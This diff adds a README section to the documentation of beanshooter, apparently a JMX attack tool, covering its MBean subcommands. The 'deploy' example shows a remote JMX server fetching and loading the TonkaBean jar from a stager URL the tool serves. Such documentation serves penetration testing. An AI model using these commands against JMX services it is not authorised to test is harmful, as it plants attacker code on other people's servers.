@@ -341,6 +341,110 @@ The `undeploy` action removes the *MBean* with the specified `ObjectName` from t
 ```
 
 
+### MBean Operations
+
+---
+
+In contrast to [basic operations](#basic-operations) that target the general functionality exposed by a *JMX*
+endpoint, *MBean operations* target a specific *MBean*. For each supported *MBean*, *beanshooter* provdides
+antoher subparser containing the available operations and options for the corresponding *MBean*. The following
+listing shows an example for the `mlet` *MBean* and the associated subparser:
+
+```console
+[qtc@devbox ~]$ beanshooter mlet -h
+usage: beanshooter mlet [-h]   ...
+
+positional arguments:
+                          
+    load                 load a new MBean from the specified URL
+    status               checks whether the MBean is registered
+    info                 print detailed information about the MBean
+    deploy               deploys the specified MBean on the JMX server
+    undeploy             undeploys the specified MBEAN from the JMX server
+
+named arguments:
+  -h, --help             show this help message and exit
+```
+
+
+### Generic MBean Operations
+
+---
+
+Some *beanshooter* operations are available on each *MBean* and are demonstrated in this section.
+
+#### Info
+
+The `info` action lists some information on the specified *MBean*:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka info
+[+] tonka
+[+] 	Object Name: 	 MLetTonkaBean:name=TonkaBean,id=1
+[+] 	Class Name: 	 de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Jar File: 	     available (tonka-bean-3.0.0-jar-with-dependencies.jar)
+```
+
+The `Jar File` information indicates whether an implementation of the corresponding *MBean* is builtin
+into *beanshooter*. This jar file is used during deployment, if not overwritten using the `--jar-file`
+option.
+
+#### Status
+
+The `status` action checks whether the corresponding *MBean* is already available on the *JMX* service:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka status 172.17.0.2 9010 
+[+] MBean Status: not deployed
+```
+
+#### Deploy
+
+The `deploy` action works basically like the `deploy` action from the [basic operations](#basic-operations).
+However, since the class name, `ObjectName` and the implementing jar file are all already associated with
+the specified *MBean*, you only need to specify the `--stager-url` option with this action (assuming that
+a builtin jar file is available):
+
+```console
+[qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url http://172.17.0.1:8000
+[+] Starting MBean deployment.
+[+]
+[+] 	Deplyoing MBean: TonkaBean
+[+]
+[+] 		MBean class is not known to the server.
+[+] 		Loading MBean from http://172.17.0.1:8000
+[+]
+[+] 			Creating HTTP server on: 172.17.0.1:8000
+[+] 				Creating MLetHandler for endpoint: /
+[+] 				Creating JarHandler for endpoint: /440441bf8c794d40a83caf1e34cd9993
+[+] 				Starting HTTP server... 
+[+] 				
+[+] 			Incoming request from: iinsecure.dev
+[+] 			Requested resource: /
+[+] 			Sending mlet:
+[+]
+[+] 				Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 				Archive:   440441bf8c794d40a83caf1e34cd9993
+[+] 				Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+] 				Codebase:  http://172.17.0.1:8000
+[+]
+[+] 			Incoming request from: iinsecure.dev
+[+] 			Requested resource: /440441bf8c794d40a83caf1e34cd9993
+[+] 			Sending jar file with md5sum: 55a843002e13f763137d115ce4caf705
+[+]
+[+] 	MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed
+```
+
+#### Undeploy
+
+The undeploy action removes the specified *MBean* from a remote *JMX* service:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka undeploy 172.17.0.2 9010 
+[+] Removing MBean with ObjectName MLetTonkaBean:name=TonkaBean,id=1 from the MBeanServer.
+[+] MBean was successfully removed.
+```
+
 ### JMXMP
 
 ---
